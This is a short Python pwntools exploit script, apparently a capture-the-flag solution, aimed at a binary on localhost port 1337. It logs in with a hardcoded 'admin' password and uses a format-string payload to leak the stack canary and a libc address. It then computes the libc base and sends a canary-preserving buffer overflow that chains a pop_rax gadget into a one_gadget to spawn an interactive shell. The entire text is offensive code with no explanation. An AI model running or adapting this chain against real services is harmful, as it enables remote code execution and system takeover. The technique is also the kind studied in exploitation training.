from pwn import *
# context.log_level = "debug"
context.arch = "amd64"

p = process("localhost", 1337)

p.sendline(b"admin")

password = b"secretpass123"
sendpw = password.ljust(0x20, b"A") + b"%15$p%17$p"
print(sendpw)
p.sendline(password.ljust(0x20, b"A") + b"%15$p%17$p")

p.recvuntil(b"entered:")
p.recvline()
leak = p.recvlineS()
print(f'ini leak: {leak}')
canary, __libc_start_main_ret = [int(x, 16) for x in leak.split("W")[0].split("0x")[1:]]
print(hex(canary))
print(hex(__libc_start_main_ret))
libc_base = __libc_start_main_ret - 0x2409b
p.sendline(b"2")
one_gadget = 0x4497f + libc_base
pop_rax = 0x000000000003a768 + libc_base
payload = b"A" * (0x50 - 0x8) + p64(canary) + p64(0) + p64(pop_rax) + p64(0) + p64(one_gadget)
tes_payload = b"A" * (0x50 - 0x8) + p64(canary) + b"B" * 8 + b"C" * 8 + b"D" * 8 + b"E" * 8
print(len(tes_payload))
print(len(payload))
p.sendline(payload)

p.interactive()